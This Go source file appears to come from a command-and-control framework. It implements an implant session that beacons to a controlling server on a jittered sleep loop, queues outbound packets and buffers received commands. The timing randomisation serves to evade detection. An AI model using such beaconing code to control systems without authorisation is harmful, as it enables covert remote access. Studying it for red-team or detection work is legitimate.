package c2

import (
	"context"
	"math"
	"math/rand"
	"time"

	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/device"
)

var (
	jitterMin int8
	jitterMax int8 = 100
)

// Session is a struct that repersents a connection between the client and
// the Listener. This struct does some automatic handeling and acts as the
// communication channel between the client and server.
type Session struct {
	ID      device.ID
	Host    *device.Machine
	Last    time.Time
	Sleep   time.Duration
	Jitter  int8
	Created time.Time
	Receive func(*com.Packet)

	ctx       context.Context
	send      chan *com.Packet
	recv      chan *com.Packet
	wake      chan bool
	server    string
	cancel    context.CancelFunc
	parent    *Handle
	connect   func(string) (Connection, error)
	wrapper   Wrapper
	transport Transport
}

// Wake will interrupt the sleep of the current
// session thread. This will trigger the send and receive functions
// of this Session.
func (s *Session) Wake() {
	if len(s.wake) < cap(s.wake) {
		s.wake <- true
	}
}
func (s *Session) wait() {
	if s.Sleep == 0 {
		return
	}
	t := s.Sleep
	if s.Jitter > jitterMin && s.Jitter < jitterMax {
		if int8(rand.Int31n(int32(jitterMax))) < s.Jitter {
			d := rand.Int63n(int64(t / time.Millisecond))
			if rand.Int31n(2) == 1 {
				d = d * -1
			}
			t += (time.Duration(d) * time.Millisecond)
			if t < 0 {
				t = time.Duration(math.Abs(float64(t)))
			}
		}
	}
	x, w := context.WithTimeout(s.ctx, t)
	select {
	case <-s.wake:
		break
	case <-x.Done():
		break
	case <-s.ctx.Done():
		break
	}
	w()
}

// Close stops the listening thread from this Session and
// releases all associated resources.
func (s *Session) Close() error {
	s.cancel()
	return nil
}
func (s *Session) listen(c *controller) {
	c.Log.Trace("[%s] Starting transaction thread...", s.ID)
	for ; s.ctx.Err() == nil; s.wait() {
		c.Log.Trace("[%s] Waking up...", s.ID)
		i, err := s.connect(s.server)
		if err != nil {
			c.Log.Warning("[%s] Received an error attempting to connect to \"%s\"! (%s)", s.ID, s.server, err.Error())
			break
		}
		c.Log.Trace("[%s] Connected to \"%s\"...", s.ID, s.server)
		if err := s.peekWrite(c, i); err != nil {
			c.Log.Warning("[%s] Received an error attempting to write to \"%s\"! (%s)", s.ID, s.server, err.Error())
			i.Close()
			break
		}
		p, err := read(i, s.wrapper, s.transport)
		if err != nil || p == nil || p.Empty() {
			if err != nil {
				c.Log.Warning("[%s] Received an error attempting to read from \"%s\"! (%s)", s.ID, s.server, err.Error())
			} else {
				c.Log.Warning("[%s] Received an empty packet from \"%s\"!", s.ID, s.server)
			}
			i.Close()
			break
		}
		if p.ID != PacketSleep {
			if s.Receive != nil {
				s.Receive(p)
			}
			if len(s.recv) == cap(s.recv) {
				<-s.recv
			}
			s.recv <- p
		}
		i.Close()
	}
	c.Log.Trace("[%s] Stopping transaction thread...", s.ID)
	s.Close()
}

// ReadPacket attempts to grab a Packet from the receiving
// buffer. This functions nil if there the buffer is empty.
func (s *Session) ReadPacket() *com.Packet {
	if len(s.recv) > 0 {
		return <-s.recv
	}
	return nil
}

// WritePacket adds the supplied Packet into the stack to be sent to the server
// on next wake. This call is asyncronous and returns immediatly.  The only error may be
// returned if the send buffer is full.
func (s *Session) WritePacket(p *com.Packet) error {
	if len(s.send) == cap(s.send) {
		return ErrFullBuffer
	}
	s.send <- p
	return nil
}
func (s *Session) peekWrite(c *controller, i Connection) error {
	select {
	case <-s.ctx.Done():
		return s.ctx.Err()
	case n := <-s.send:
		c.Log.Trace("[%s] Sending Packet \"%s\" to \"%s\".", n.String(), s.ID, s.server)
		if err := write(i, s.wrapper, s.transport, n); err != nil {
			return err
		}
	default:
		if err := write(i, s.wrapper, s.transport, pingPacket); err != nil {
			return err
		}
	}
	return nil
}
